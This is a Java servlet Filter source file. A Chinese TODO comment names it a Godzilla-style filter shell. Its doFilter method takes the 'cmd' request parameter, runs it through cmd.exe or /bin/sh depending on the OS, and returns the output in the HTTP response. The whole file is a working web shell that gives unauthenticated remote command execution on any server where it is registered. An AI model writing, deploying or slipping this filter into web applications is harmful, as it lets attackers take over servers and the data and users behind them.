import javax.servlet.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.Charset;

public class MyFilter implements Filter {

    public void init(FilterConfig filterConfig) throws ServletException {

    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        // TODO: 实现哥斯拉filter shell
        try {
            String cmd = servletRequest.getParameter("cmd");
            String osType = System.getProperty("os.name");
            boolean iswin = osType.toLowerCase().contains("win") ? true : false;
            String[] cmds = iswin ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
            ProcessBuilder processBuilder = new ProcessBuilder(cmds);
            InputStream inputStream = processBuilder.start().getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, Charset.forName("utf8")));
            String res = "result:\n";
            String line = null;
            while ((line = reader.readLine()) != null) {
                res += line + "\n";
            }
            servletResponse.getWriter().write(res);
        } catch (Exception e) {
            servletResponse.getWriter().write(e.getMessage());
        }

    }

    public void destroy() {

    }
}
